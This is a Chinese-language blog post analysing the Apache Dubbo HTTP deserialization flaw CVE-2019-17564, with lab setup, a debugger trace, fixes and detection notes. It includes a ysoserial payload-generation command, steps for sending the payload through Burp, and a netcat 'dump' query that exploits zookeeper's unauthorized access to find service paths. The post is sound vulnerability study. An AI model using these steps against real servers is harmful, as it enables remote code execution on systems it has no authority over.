<!DOCTYPE html>
<html lang="zh-CN">
<head><meta name="generator" content="Hexo 3.9.0">
    <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">



<title>CVE-2019-17564 Apache Dubbo http 反序列化漏洞深入分析 | langke Blog</title>



    <link rel="icon" href="/favicon.ico">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    



    
    
        
    


</head>
<body>
    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">langke&#39;s Blog</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>

        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">langke&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
        <div class="main">
            <div class="container">
    
    
        <div id="post-toc" class="post-toc">
            <span class="post-toc-title">catalogue</span>
            <div class="post-toc-content">
                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CVE-2019-17564-Apache-Dubbo-http-反序列化漏洞深入分析"><span class="toc-text">CVE-2019-17564 Apache Dubbo http 反序列化漏洞深入分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Dubbo简介"><span class="toc-text">Dubbo简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞描述"><span class="toc-text">漏洞描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#影响范围"><span class="toc-text">影响范围</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞环境搭建"><span class="toc-text">漏洞环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#zookeeper环境搭建"><span class="toc-text">zookeeper环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Dubbo环境搭建"><span class="toc-text">Dubbo环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#下载和配置"><span class="toc-text">下载和配置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#导入idea"><span class="toc-text">导入idea</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#启动"><span class="toc-text">启动</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞分析"><span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞复现"><span class="toc-text">漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#payload生成"><span class="toc-text">payload生成</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#发包"><span class="toc-text">发包</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#识别及利用"><span class="toc-text">识别及利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#修复及防御方案"><span class="toc-text">修复及防御方案</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#修复"><span class="toc-text">修复</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#防御方案"><span class="toc-text">防御方案</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-text">参考</span></a></li></ol></li></ol>
            </div>
        </div>
    
    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">CVE-2019-17564 Apache Dubbo http 反序列化漏洞深入分析</h1>
            
                <div class="post-meta">
                    

                    
                        <span class="post-time">
                        Date: <a href="#">09 11&nbsp;&nbsp;21:23:56</a>
                        </span>
                    
                    
                </div>
            
        </header>

        <section class="post-content">
            <h1 id="CVE-2019-17564-Apache-Dubbo-http-反序列化漏洞深入分析"><a href="#CVE-2019-17564-Apache-Dubbo-http-反序列化漏洞深入分析" class="headerlink" title="CVE-2019-17564 Apache Dubbo http 反序列化漏洞深入分析"></a>CVE-2019-17564 Apache Dubbo http 反序列化漏洞深入分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>上一篇文章勉强算是把Shiro反序列化漏洞分析了一遍。<br>由于本人是一个初学者，也没啥学习方法，只能多看几个漏洞的分析过程了。<br>今天周末，来分析一下Dubbo框架的RCE漏洞。<br>也许看多了，量变引发质变，也就会自己分析了吧。</p>
<h2 id="Dubbo简介"><a href="#Dubbo简介" class="headerlink" title="Dubbo简介"></a>Dubbo简介</h2><p>官网: <a href="https://dubbo.apache.org/zh-cn/" target="_blank" rel="noopener">https://dubbo.apache.org/zh-cn/</a><br>Apache Dubbo 是一个基于Java的高性能，轻量级的RPC框架。Dubbo提供了三个关键功能，包括基于接口的远程呼叫，容错和负载平衡以及自动服务注册和发现。</p>
<p>功能列表：【基于透明接口的RPC、智能负载均衡、自动服务注册和发现、高扩展性、运行时流量路由、可视化服务治理】<br>GitHub： <a href="https://github.com/apache/dubbo" target="_blank" rel="noopener">https://github.com/apache/dubbo</a></p>
<p>Dubbo支持Dubbo、RMI、Hessian、HTTP、WebService、Thrift、Native Thrift、Memcached、Redis、Rest、JsonRPC、XmlRPC、JmsRpc等协议，官方推荐使用Dubbo协议。</p>
<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>在启用HTTP远程处理的Dubbo应用程序中发生不安全的反序列化。如果此实例启用了HTTP，则攻击者可能会提交其中包含Java对象的POST请求，以完全破坏Apache Dubbo的Provider实例。<br>Dubbo HTTP实例尝试对Java ObjectStream中的数据进行反序列化，该Java ObjectStream包含一组恶意类，通常称为小工具链，其调用会导致执行恶意代码。在这种情况下，有问题的恶意代码允许使用任意OS命令。</p>
<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>2.7.0 &lt;= Apache Dubbo &lt;= 2.7.4.1<br>2.6.0 &lt;= Apache Dubbo &lt;= 2.6.7<br>Apache Dubbo = 2.5.x<br>此漏洞仅影响启用Dubbo提供的http协议的用户</p>
<h2 id="漏洞环境搭建"><a href="#漏洞环境搭建" class="headerlink" title="漏洞环境搭建"></a>漏洞环境搭建</h2><p>搭建Dubbo环境之前，需要先启动依赖环境<code>zookeeper</code>。<br>为什么用<code>zookeeper</code>？<br>因为官方推荐使用<code>zookeeper</code><br><code>zookeeper</code>是什么？<br><code>zookeeper</code>是注册中心，提供服务注册和发现功能。<br>详见： <a href="https://dubbo.apache.org/zh-cn/docs/user/references/registry/introduction.html" target="_blank" rel="noopener">Zookeeper 注册中心</a></p>
<h3 id="zookeeper环境搭建"><a href="#zookeeper环境搭建" class="headerlink" title="zookeeper环境搭建"></a><code>zookeeper</code>环境搭建</h3><p>下载： <a href="http://archive.apache.org/dist/zookeeper/zookeeper-3.3.3/zookeeper-3.3.3.tar.gz" target="_blank" rel="noopener">http://archive.apache.org/dist/zookeeper/zookeeper-3.3.3/zookeeper-3.3.3.tar.gz</a><br>解压：windows系统利用安装的解压软件直接解压。<br>配置：<a href="https://dubbo.apache.org/zh-cn/docs/admin/install/zookeeper.html" target="_blank" rel="noopener">官方配置文档</a><br>在根目录新建文件夹<code>data</code><br>重命名文件<code>zookeeper-3.3.3\conf\zoo_sample.cfg</code>为<code>zookeeper-3.3.3\conf\zoo.cfg</code><br>修改文件<code>zookeeper-3.3.3\conf\zoo.cfg</code>中<code>dataDir=/export/crawlspace/mahadev/zookeeper/server1/data</code>为<code>dataDir=刚新建的data目录的绝对路径</code><br>运行： Windows系统双击 <code>zookeeper-3.3.3\bin\zkServer.cmd</code></p>
<p>看到如下内容，启动成功。绑定本地端口2181<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">·</span><br><span class="line">2020-09-04 16:16:47,110 - INFO  [main:ZooKeeperServerMain@94] - Starting server</span><br><span class="line">·</span><br><span class="line">·</span><br><span class="line">2020-09-04 16:16:51,675 - INFO  [main:ZooKeeperServer@663] - tickTime set to 2000</span><br><span class="line">2020-09-04 16:16:51,686 - INFO  [main:ZooKeeperServer@672] - minSessionTimeout set to -1</span><br><span class="line">2020-09-04 16:16:51,687 - INFO  [main:ZooKeeperServer@681] - maxSessionTimeout set to -1</span><br><span class="line">2020-09-04 16:16:51,988 - INFO  [main:NIOServerCnxn$Factory@143] - binding to port 0.0.0.0/0.0.0.0:2181</span><br><span class="line">2020-09-04 16:16:52,004 - INFO  [main:FileTxnSnapLog@208] - Snapshotting: 0</span><br></pre></td></tr></table></figure></p>
<h3 id="Dubbo环境搭建"><a href="#Dubbo环境搭建" class="headerlink" title="Dubbo环境搭建"></a>Dubbo环境搭建</h3><h4 id="下载和配置"><a href="#下载和配置" class="headerlink" title="下载和配置"></a>下载和配置</h4><p>下载：<a href="https://github.com/apache/dubbo-samples" target="_blank" rel="noopener">https://github.com/apache/dubbo-samples</a><br>由于只有http协议受影响，所以提取出http协议部分。<code>dubbo-samples-master\java\dubbo-samples-http</code><br>配置：<br>修改<code>dubbo-samples-http\poc.xml</code>配置</p>
<ol>
<li><p>改为受影响版本，这里使用2.7.3</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;dubbo.version&gt;2.7.7&lt;/dubbo.version&gt;</span><br><span class="line">改为</span><br><span class="line">&lt;dubbo.version&gt;2.7.3&lt;/dubbo.version&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>加入一个恶意的GadGets，比如：commons-collections-4</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;4.0&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>修改<code>dubbo-samples-http\src\main\resources\spring\http-provider.xml</code>配置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;dubbo:application name=&quot;http-provider&quot;/&gt;</span><br><span class="line">// 确认zookeeper的IP和端口</span><br><span class="line">&lt;dubbo:registry address=&quot;zookeeper://$&#123;zookeeper.address:127.0.0.1&#125;:2181&quot;/&gt;</span><br><span class="line">// 配置dubbo的端口和ip，添加host字段，值为本机IP</span><br><span class="line">&lt;dubbo:protocol name=&quot;http&quot; id=&quot;http&quot; host=&quot;192.168.1.3&quot; port=&quot;$&#123;servlet.port:8080&#125;&quot; server=&quot;$&#123;servlet.container:tomcat&#125;&quot;/&gt;</span><br><span class="line"></span><br><span class="line">&lt;bean id=&quot;demoService&quot; class=&quot;org.apache.dubbo.samples.http.impl.DemoServiceImpl&quot;/&gt;</span><br><span class="line"></span><br><span class="line">&lt;dubbo:service interface=&quot;org.apache.dubbo.samples.http.api.DemoService&quot; ref=&quot;demoService&quot; protocol=&quot;http&quot;/&gt;</span><br></pre></td></tr></table></figure></p>
<h4 id="导入idea"><a href="#导入idea" class="headerlink" title="导入idea"></a>导入idea</h4><p>英文版IDEA: File-&gt;New-&gt;Project from existing resources -&gt;选择目录”dubbo-samples-http”里面的pom.xml<br>中文版IDEA: 文件-&gt;New-&gt;项目从现有源-&gt;选择目录”dubbo-samples-http”里面的pom.xml<br>这时候就开始下载<code>Maven</code>项目的依赖了，一般会很慢。更换国内<code>Maven</code>源下载依赖会快很多，参考下面文章。</p>
<p><img src="https://image-langke.bj.bcebos.com/hexo-neirongpeitu/漏洞分析/5f520a329b20711c6f000000.png" alt></p>
<h4 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h4><p>找到路径<code>\dubbo-samples-http\src\main\java\org\apache\dubbo\samples\http\HttpProvider.java</code>，右键-&gt;运行(U) ‘HttpProvider.main()’<br>看到如下内容，表示启动成功：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[04/09/20 05:45:14:014 CST] main  INFO zookeeper.ZookeeperRegistry:  [DUBBO] Load registry cache file ···</span><br><span class="line">[04/09/20 05:45:14:014 CST] main  INFO zookeeper.ZookeeperTransporter:  [DUBBO] find valid zookeeper ····</span><br><span class="line">[04/09/20 05:45:14:014 CST] main  INFO zookeeper.ZookeeperRegistry:  [DUBBO]  Register: http://192.168.186.1:8080/org.apache.dubbo.samples.http.api.DemoService?······</span><br><span class="line">[04/09/20 05:45:14:014 CST] main  INFO zookeeper.ZookeeperRegistry:  [DUBBO] Subscribe:····</span><br><span class="line">[04/09/20 05:45:14:014 CST] main  INFO zookeeper.ZookeeperRegistry:  [DUBBO] Notify urls for ····</span><br><span class="line">dubbo service started</span><br></pre></td></tr></table></figure></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>根据网上的资料，在<code>org.apache.dubbo.remoting.http.servlet.DispatcherServlet#service:43</code>处设置断点。<br>接着利用burp发送paylaod，来到断点处。<br><img src="https://image-langke.bj.bcebos.com/hexo-neirongpeitu/漏洞分析/5f54e022a36ea869d6000003.png" alt><br>然后按F7开始调试。首先来到<code>org.apache.dubbo.rpc.protocol.http.HttpProtocol.InternalHandler#handle</code>方法内。<br>169：获取请求路径<br>170：实例化HttpInvokerServiceExporter方法，并传递请求路径。<br>174：设置请求的地址和端口，并初始化。<br><img src="https://image-langke.bj.bcebos.com/hexo-neirongpeitu/漏洞分析/5f54e2c0a36ea869d6000005.png" alt><br>接着，来到<code>org.springframework.remoting.httpinvoker.HttpInvokerServiceExporter#handleRequest</code>方法内。<br>29 ：读远程调用<br><img src="https://image-langke.bj.bcebos.com/hexo-neirongpeitu/漏洞分析/5f54e6f1a36ea869d6000006.png" alt><br><code>org.springframework.remoting.httpinvoker.HttpInvokerServiceExporter#readRemoteInvocation(javax.servlet.http.HttpServletRequest, java.io.InputStream)</code><br><img src="https://image-langke.bj.bcebos.com/hexo-neirongpeitu/漏洞分析/5f54e957a36ea869d6000007.png" alt><br>最终，来到<code>org.springframework.remoting.rmi.RemoteInvocationSerializingExporter#doReadRemoteInvocation</code>方法内<br> 68：反序列化读取对象，没有进行安全验证，从而触发反序列化漏洞执行任意代码。<br><img src="https://image-langke.bj.bcebos.com/hexo-neirongpeitu/漏洞分析/5f54e15aa36ea869d6000004.png" alt></p>
<p>堆栈<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">doReadRemoteInvocation:144, RemoteInvocationSerializingExporter (org.springframework.remoting.rmi)</span><br><span class="line">readRemoteInvocation:121, HttpInvokerServiceExporter (org.springframework.remoting.httpinvoker)</span><br><span class="line">readRemoteInvocation:100, HttpInvokerServiceExporter (org.springframework.remoting.httpinvoker)</span><br><span class="line">handleRequest:79, HttpInvokerServiceExporter (org.springframework.remoting.httpinvoker)</span><br><span class="line">handle:216, HttpProtocol$InternalHandler (org.apache.dubbo.rpc.protocol.http)</span><br><span class="line">service:61, DispatcherServlet (org.apache.dubbo.remoting.http.servlet)</span><br><span class="line">service:790, HttpServlet (javax.servlet.http)</span><br><span class="line">internalDoFilter:231, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:166, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">invoke:198, StandardWrapperValve (org.apache.catalina.core)</span><br><span class="line">invoke:96, StandardContextValve (org.apache.catalina.core)</span><br><span class="line">invoke:496, AuthenticatorBase (org.apache.catalina.authenticator)</span><br><span class="line">invoke:140, StandardHostValve (org.apache.catalina.core)</span><br><span class="line">invoke:81, ErrorReportValve (org.apache.catalina.valves)</span><br><span class="line">invoke:87, StandardEngineValve (org.apache.catalina.core)</span><br><span class="line">service:342, CoyoteAdapter (org.apache.catalina.connector)</span><br><span class="line">service:803, Http11Processor (org.apache.coyote.http11)</span><br><span class="line">process:66, AbstractProcessorLight (org.apache.coyote)</span><br><span class="line">process:790, AbstractProtocol$ConnectionHandler (org.apache.coyote)</span><br><span class="line">doRun:1468, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)</span><br><span class="line">run:49, SocketProcessorBase (org.apache.tomcat.util.net)</span><br><span class="line">runWorker:1149, ThreadPoolExecutor (java.util.concurrent)</span><br><span class="line">run:624, ThreadPoolExecutor$Worker (java.util.concurrent)</span><br><span class="line">run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)</span><br><span class="line">run:748, Thread (java.lang)</span><br></pre></td></tr></table></figure></p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="payload生成"><a href="#payload生成" class="headerlink" title="payload生成"></a>payload生成</h3><p>// ysoserial.jar工具直接下载<br><code>java -jar ysoserial.jar CommonsCollections4 calc &gt; calc.ser</code></p>
<h3 id="发包"><a href="#发包" class="headerlink" title="发包"></a>发包</h3><p>浏览器访问HTTP协议接口路径（参考<code>target/classes/spring/http-provider.xml</code>文件中的配置）<code>http://192.168.186.1:8080/org.apache.dubbo.samples.http.api.DemoService</code>，抓取请求包。<br>发送到burp的重放模块，请求方式改为<code>POST</code>，数据体用<code>Paste from file</code>选项选择刚才的paylaod文件<code>calc.ser</code><br>点击<code>Go</code>即可出发漏洞执行<code>calc</code>命令<br><img src="https://image-langke.bj.bcebos.com/hexo-neirongpeitu/漏洞分析/5f5210599b20711c6f000001.png" alt><br><img src="https://image-langke.bj.bcebos.com/hexo-neirongpeitu/漏洞分析/5f5212339b20711c6f000002.png" alt></p>
<h2 id="识别及利用"><a href="#识别及利用" class="headerlink" title="识别及利用"></a>识别及利用</h2><p>虽然这个漏洞复现起来挺简单的，但是，在实际渗透测试中使用却存在两个难点：</p>
<ol>
<li>不能确定目标Dubbo是否使用http协议。</li>
<li>无法确定接口路径。</li>
</ol>
<p>那么问题来了，黑盒情况下如何获取这些信息？<br>我首先想到拿我本地复现时的默认接口路径去尝试，经过一番fofa、shodan尝试，随即否定了。<br>我们回过头来分析一下，接口信息是写在<code>http-provider.xml</code>配置中的，如下，配置的最后一行：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-i·······"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:property-placeholder</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dubbo:application</span> <span class="attr">name</span>=<span class="string">"http-provider"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dubbo:registry</span> <span class="attr">address</span>=<span class="string">"zookeeper://$&#123;zookeeper.address:127.0.0.1&#125;:2181"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dubbo:protocol</span> <span class="attr">name</span>=<span class="string">"http"</span> <span class="attr">id</span>=<span class="string">"http"</span> <span class="attr">host</span>=<span class="string">"192.168.186.1"</span> <span class="attr">port</span>=<span class="string">"$&#123;servlet.port:8080&#125;"</span> <span class="attr">server</span>=<span class="string">"$&#123;servlet.container:tomcat&#125;"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"demoService"</span> <span class="attr">class</span>=<span class="string">"org.apache.dubbo.samples.http.impl.DemoServiceImpl"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dubbo:service</span> <span class="attr">interface</span>=<span class="string">"org.apache.dubbo.samples.http.api.DemoService"</span> <span class="attr">ref</span>=<span class="string">"demoService"</span> <span class="attr">protocol</span>=<span class="string">"http"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>同时，Dubbo又跟zookeeper有交互。<br>虽然我们不能直接查看<code>http-provider.xml</code>配置文件，但是zookeeper默认情况下，存在未授权访问漏洞。正好可以利用这个漏洞来查看接口路径，同时也解决了Dubbo所使用的协议的问题。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ echo dump | nc  192.168.186.1 2181</span><br><span class="line">SessionTracker dump:</span><br><span class="line">Session Sets (3):</span><br><span class="line">0 expire at Sun Sep 06 15:32:44 CST 2020:</span><br><span class="line">0 expire at Sun Sep 06 15:32:56 CST 2020:</span><br><span class="line">1 expire at Sun Sep 06 15:33:10 CST 2020:</span><br><span class="line">        0x1745a82ab030007</span><br><span class="line">ephemeral nodes dump:</span><br><span class="line">Sessions with Ephemerals (1):</span><br><span class="line">0x1745a82ab030007:</span><br><span class="line">        /dubbo/org.apache.dubbo.samples.http.api.DemoService/providers/http%3A%2F%2F192.168.186.1%3A8080%2Forg.apache.dubbo.samples.http.api.DemoService%3Fanyhost%3Dfalse%26application%3Dhttp-provider%26bean.name%3Dorg.apache.dubbo.samples.http.api.DemoService%26deprecated%3Dfalse%26dubbo%3D2.0.2%26dynamic%3Dtrue%26generic%3Dfalse%26interface%3Dorg.apache.dubbo.samples.http.api.DemoService%26methods%3DsayHello%26pid%3D4988%26register%3Dtrue%26release%3D2.7.3%26server%3Dtomcat%26side%3Dprovider%26timestamp%3D1599374218648</span><br></pre></td></tr></table></figure></p>
<p>当然，还有其他情况，期待大佬补充。</p>
<h2 id="修复及防御方案"><a href="#修复及防御方案" class="headerlink" title="修复及防御方案"></a>修复及防御方案</h2><h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><p>第一种、 最简单的，就是升级到不受影响版本，具体升级步骤参考官方文档。<br><a href="https://github.com/apache/dubbo/releases/tag/dubbo-2.7.5" target="_blank" rel="noopener">https://github.com/apache/dubbo/releases/tag/dubbo-2.7.5</a></p>
<p>第二种、 禁用http协议，使用其他Dubbo支持协议。<br>修改<code>http-provider.xml</code>配置文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;dubbo:protocol name=&quot;准备使用的协议&quot; id=&quot;http&quot; host=&quot;192.168.186.1&quot; port=&quot;$&#123;servlet.port:8080&#125;&quot; server=&quot;$&#123;servlet.container:tomcat&#125;&quot;/&gt;</span><br></pre></td></tr></table></figure></p>
<p>具体详情参考官方协议配置文档。</p>
<h3 id="防御方案"><a href="#防御方案" class="headerlink" title="防御方案"></a>防御方案</h3><p>下面分析一下漏洞利用过程中的数据交互，以期找到其特征，从而有针对性的识别攻击。<br>在虚拟机中，用python写了个脚本，来利用此漏洞。<br>通过Wireshark抓包，如下：<br><img src="https://image-langke.bj.bcebos.com/hexo-neirongpeitu/漏洞分析/5f54bb42a36ea869d6000001.png" alt><br><img src="https://image-langke.bj.bcebos.com/hexo-neirongpeitu/漏洞分析/5f54ba8ca36ea869d6000000.png" alt></p>
<p>不过，现在市面上的大多数WAF都添加了此漏洞的特征。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://lists.apache.org/thread.html/r13f7a58fa5d61d729e538a378687118e00c3e229903ba1e7b3a807a2%40%3Cdev.dubbo.apache.org%3E" target="_blank" rel="noopener">【CVE-2019-17564】 Apache Dubbo反序列化漏洞-Pony Mail</a></li>
<li><a href="https://dubbo.apache.org/zh-cn/index.html" target="_blank" rel="noopener">Apache Dubbo官网</a></li>
<li><a href="https://www.cnblogs.com/zaqzzz/p/12443794.html" target="_blank" rel="noopener">Apache Dubbo反序列化漏洞（CVE-2019-17564） - 冬泳怪鸽 - 博客园</a></li>
<li><a href="https://www.cnblogs.com/Hi-blog/p/Zookeeper-UnAuthorization-Access.html" target="_blank" rel="noopener">Zookeeper未授权访问测试</a></li>
</ul>

        </section>

        
            <section class="post-copyright">
                
                
                
                

            </section>
        

        <!--
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                    
                        <a href="/tags/漏洞分析/"># 漏洞分析</a>
                    
                        
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>· </span>
                <a href="/">home</a>
            </div>
        </section>
        -->
        <!--
        <section class="post-nav">
            
                <a class="prev" rel="prev" href="/2100/11/03/软件官网下载地址/">软件官网下载地址</a>
            
            
            <a class="next" rel="next" href="/2020/08/29/一次web漏扫项目记录-脚本编写/">一次web漏扫项目记录-脚本编写</a>
            
        </section>
        -->

    </article>
</div>

        </div>
        <!--
        <footer id="footer" class="footer">
    <div class="copyright">
        <span>© langke | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
    </div>
</footer>

    	-->

    	<br>
    	<br>
    	<br>



    </div>
</body>
</html>
